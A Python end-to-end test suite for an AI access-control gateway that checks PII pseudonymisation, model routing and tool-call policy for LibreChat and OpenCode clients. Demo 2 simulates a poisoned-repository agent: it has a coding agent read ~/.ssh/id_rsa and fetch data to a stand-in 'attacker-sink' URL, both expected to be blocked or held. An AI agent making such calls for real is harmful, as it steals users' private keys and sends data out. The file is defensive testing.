"""Client demos on the LIVE models (no mock directives): the three scripted demos of docs/demo/clients-checklist.md.

1. LibreChat banking chat (scenarios 1, 5, 14): anna's PESEL + IBAN prompt typed into LibreChat is pseudonymised and
   answered by a local model; anna and jan see different model lists; anna's published skill is one of her models.
2. OpenCode poisoned repository (scenario 3): the plugin's /v1/decide calls (same body, session id and headers the
   plugin sends) deny the ~/.ssh/id_rsa read with a rule id and hold the exfiltration (Rule of Two) for an admin;
   the admin approves once in the panel/admin API, the identical call then proceeds once and is held again after.
3. Admin User 360 (scenario 12): an admin denies `opencode.bash` for anna through the grants API, her next shell
   call is blocked with the rule id; revoking the grant restores it.

Skips cleanly when the stack, the clients profile or the live models are not up. Polish legal -> Bielik is checked
too, and reported as an expected failure while the running gateway does not route it there yet.
"""

from __future__ import annotations

import json
import time
import uuid
from typing import Any

import httpx
import pytest
from e2e.helpers import PESEL_EXAMPLE, Stack
from e2e.test_cp2_clients import LIBRECHAT_URL, RULE_ID_IN_MESSAGE, LibreChatSession, _container

pytestmark = [pytest.mark.e2e, pytest.mark.timeout(300)]

IBAN_EXAMPLE = "PL61109010140000071219812874"  # the textbook example IBAN, not a real account


@pytest.fixture(scope="module")
def live(stack: Stack) -> Stack:
    """The gateway answers with a real model (deterministic mode off and the local tier reachable)."""
    r = stack.chat("anna", "Reply with the single word: ok", model="local", max_tokens=20)
    if r.status_code != 200:
        pytest.skip(f"live local model not answering through the gateway (HTTP {r.status_code})")
    if r.headers.get("x-acl-model", "").startswith("mock"):
        pytest.skip("gateway is in deterministic (mock) mode; these demos need ACL_DETERMINISTIC=0")
    return stack


@pytest.fixture(scope="module")
def librechat() -> None:
    if _container("librechat") is None:
        pytest.skip("clients profile not running: no `librechat` container")
    try:
        httpx.get(f"{LIBRECHAT_URL}/api/config", timeout=5).raise_for_status()
    except httpx.HTTPError:
        pytest.skip(f"LibreChat not answering at {LIBRECHAT_URL}")


def _lc_chat(s: LibreChatSession, text: str, model: str = "auto") -> str:
    payload = {
        "text": text,
        "endpoint": "Company AI",
        "endpointType": "custom",
        "model": model,
        "conversationId": "new",
        "parentMessageId": "00000000-0000-0000-0000-000000000000",
        "messageId": str(uuid.uuid4()),
        "isTemporary": True,
    }
    r, _ = s.browser.request(
        "POST",
        f"{LIBRECHAT_URL}/api/agents/chat/Company%20AI",
        headers=s.headers | {"content-type": "application/json"},
        content=json.dumps(payload),
    )
    assert r.status_code == 200, f"LibreChat refused the chat: HTTP {r.status_code}"
    return r.json()["conversationId"]


def _chat_event(stack: Stack, user: str, conversation: str, timeout: float = 90) -> dict[str, Any]:
    """The audit event of the model call LibreChat made for this conversation (session = <principal>:<conv id>)."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        for e in stack.admin("GET", "/events?limit=50").json():
            if e.get("username") == user and (e.get("session_id") or "").endswith(conversation) and e.get("model"):
                return e
        time.sleep(2)
    pytest.fail(f"no routed audit event for {user}'s LibreChat conversation within {timeout}s")


# ------------------------------------------------------------------------------------- demo 1: LibreChat banking


def test_demo1_librechat_pesel_and_iban_are_pseudonymised_and_stay_local(live: Stack, librechat: None) -> None:
    s = LibreChatSession("anna")
    try:
        conv = _lc_chat(
            s,
            f"Klient Jan Kowalski, PESEL {PESEL_EXAMPLE}, IBAN {IBAN_EXAMPLE} prosi o odroczenie raty. "
            "Napisz krótką notatkę.",
        )
    finally:
        s.close()
    event = _chat_event(live, "anna", conv)
    assert "pseudonymise" in (event.get("applied") or []) or event.get("action") == "pseudonymise", event
    assert (event.get("model") or "").startswith("local/"), f"confidential data must stay local: {event.get('model')}"
    assert event.get("tier") in (None, "local"), event


def test_demo1_model_lists_are_personalised_and_the_skill_is_a_model(live: Stack, librechat: None) -> None:
    seen: dict[str, list[str]] = {}
    for user in ("anna", "jan"):
        s = LibreChatSession(user)
        try:
            seen[user] = s.get("/api/models").json()["Company AI"]
        finally:
            s.close()
    assert seen["anna"] != seen["jan"]
    assert any(m.startswith("skill/") for m in seen["anna"]), f"published skill missing for anna: {seen['anna']}"
    assert not any(m.startswith("skill/") for m in seen["jan"]), "the credit-analysts skill must not reach developers"


def test_demo1_general_english_question_goes_to_gemini(live: Stack, librechat: None) -> None:
    s = LibreChatSession("jan")
    try:
        conv = _lc_chat(s, "In one sentence: what is the capital of Australia?")
    finally:
        s.close()
    event = _chat_event(live, "jan", conv)
    if not (event.get("model") or "").startswith("gemini/"):
        pytest.skip(f"cloud tier not used for public data on this stack (model {event.get('model')}); no Gemini key?")


def test_demo1_polish_legal_question_goes_to_bielik(live: Stack, librechat: None) -> None:
    s = LibreChatSession("jan")
    try:
        conv = _lc_chat(s, "Czy umowa najmu zawarta ustnie jest ważna według kodeksu cywilnego?")
    finally:
        s.close()
    model = _chat_event(live, "jan", conv).get("model") or ""
    if model != "local/bielik":
        pytest.xfail(f"Polish legal routed to {model}: the Polish-legal specialist rule is not live on this gateway")


# ------------------------------------------------------------------------------- demo 2: OpenCode poisoned repo


def _decide(stack: Stack, user: str, session: str, tool: str, args: dict[str, Any]) -> dict[str, Any]:
    """Exactly what @corp/opencode-guard sends from tool.execute.before."""
    body = {
        "session_id": session,
        "action": {
            "kind": "tool_call",
            "tool": tool,
            "arguments": args,
            "tool_call_id": f"call_{uuid.uuid4().hex[:8]}",
            "cwd": "/workspace/demo-repo",
            "workspace_root": "/workspace/demo-repo",
        },
        "client": {"app": "opencode", "version": "opencode-1.18.34", "device_id": "dev-e2e-live"},
    }
    headers = {**stack.auth(user), "X-Device-Id": "dev-e2e-live", "X-Client-App": "opencode"}
    r = stack.http.post(f"{stack.cfg.gateway}/v1/decide", json=body, headers=headers)
    assert r.status_code == 200, f"/v1/decide: HTTP {r.status_code} {r.text[:200]}"
    return r.json()


def test_demo2_poisoned_repo_key_read_denied_and_exfil_held_then_approved_once(live: Stack) -> None:
    session = f"ses_live_{uuid.uuid4().hex[:10]}"
    key = _decide(live, "jan", session, "opencode.read", {"filePath": "/home/dev/.ssh/id_rsa"})
    assert key["action"] == "block" and key["rule_ids"], key
    assert all(RULE_ID_IN_MESSAGE.fullmatch(f"[{r}]") for r in key["rule_ids"])

    readme = _decide(live, "jan", session, "opencode.read", {"filePath": "/workspace/demo-repo/README.md"})
    assert readme["action"] == "allow", readme  # reading the repo is fine, but taints the session

    exfil = {"url": "http://attacker-sink:8080/collect?d=ZGVtbw"}
    held = _decide(live, "jan", session, "web.fetch", exfil)
    assert held["action"] == "require_approval" and "SEC-FLOW-01" in held["rule_ids"], held
    ref = held["approval"]
    assert ref["approver_scope"] == "admin", "the agent's own user must not be able to release a Rule-of-Two hold"
    own = live.http.post(
        f"{live.cfg.gateway}/v1/approvals/{ref['approval_id']}/decision",
        json={"decision": "approve"},
        headers=live.auth("jan"),
    )
    assert own.status_code in (403, 409), "jan approved her own exfiltration"

    # what the plugin polls while the TUI shows "Approval pending"
    pending = live.http.get(f"{live.cfg.gateway}/v1/approvals/{ref['approval_id']}", headers=live.auth("jan"))
    assert pending.status_code == 200 and pending.json()["status"] == "pending"

    ok = live.admin("POST", f"/approvals/{ref['approval_id']}/decision", json={"decision": "approve", "note": "e2e"})
    assert ok.status_code == 200, ok.text[:200]
    status = live.http.get(f"{live.cfg.gateway}/v1/approvals/{ref['approval_id']}", headers=live.auth("jan"))
    assert status.json()["status"] == "approved"
    again = _decide(live, "jan", session, "web.fetch", exfil)
    assert again["action"] in ("allow", "monitor"), f"approved call must proceed once: {again}"
    third = _decide(live, "jan", session, "web.fetch", exfil)
    assert third["action"] not in ("allow", "monitor"), f"approve-once was spent twice: {third}"


# ------------------------------------------------------------------------------------ demo 3: admin revokes bash


def test_demo3_admin_revokes_bash_for_anna_next_call_blocked(live: Stack) -> None:
    session = f"ses_live_{uuid.uuid4().hex[:10]}"
    before = _decide(live, "anna", session, "opencode.bash", {"command": "git status"})
    assert before["action"] in ("allow", "monitor"), before
    r = live.admin(
        "POST",
        "/grants",
        json={
            "subject_type": "user",
            "subject": "anna",
            "resource_type": "tool",
            "resource": "opencode.bash",
            "effect": "deny",
            "reason": "e2e demo 3: User 360 revoke",
        },
    )
    assert r.status_code == 201, r.text[:200]
    grant = r.json()["id"]
    try:
        after = _decide(live, "anna", session, "opencode.bash", {"command": "git status"})
        assert after["action"] == "block" and after["rule_ids"], after
    finally:
        live.admin("DELETE", f"/grants/{grant}", params={"reason": "e2e cleanup"})
    restored = _decide(live, "anna", f"{session}b", "opencode.bash", {"command": "git status"})
    assert restored["action"] in ("allow", "monitor"), restored
